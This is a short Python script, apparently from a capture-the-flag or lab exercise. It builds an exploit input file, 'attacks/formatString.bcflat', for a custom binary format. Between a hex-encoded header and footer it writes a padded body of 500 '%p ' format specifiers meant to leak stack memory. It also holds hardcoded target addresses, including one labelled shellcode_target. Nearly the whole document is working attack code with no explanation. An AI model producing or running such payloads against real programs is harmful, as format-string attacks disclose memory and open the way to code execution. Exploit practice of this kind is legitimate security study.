import struct
shellcode_target = 0x4027c1
info = 0x402852

def pad(s):
    return s + b'X' * (65535 - len(s))

def header():
    return bytes.fromhex("4243464cc384540a0000000000000d030000000000000001000000000000000146524d54000000000000ffff")

def footer():
    return bytes.fromhex("4441544100dfd62000dfd6202bef2f60002bef2f60007feeb7207feeb720")

exploit = b""
# exploit += struct.pack("L", info)
exploit += b"%p " * 500

file_path = "attacks/formatString.bcflat"

# Use the "wb" mode to open the file for writing (creates a new file or overwrites an existing one)
with open(file_path, "wb") as file:
    # Empty the file by writing an empty byte string
    file.write(b"")
    file.seek(0)  # Set the file position back to the beginning
    # Write data to the file
    file.write(header())
    file.write(pad(exploit))
    file.write(footer())

print(f"Exploit data has been written to {file_path}")
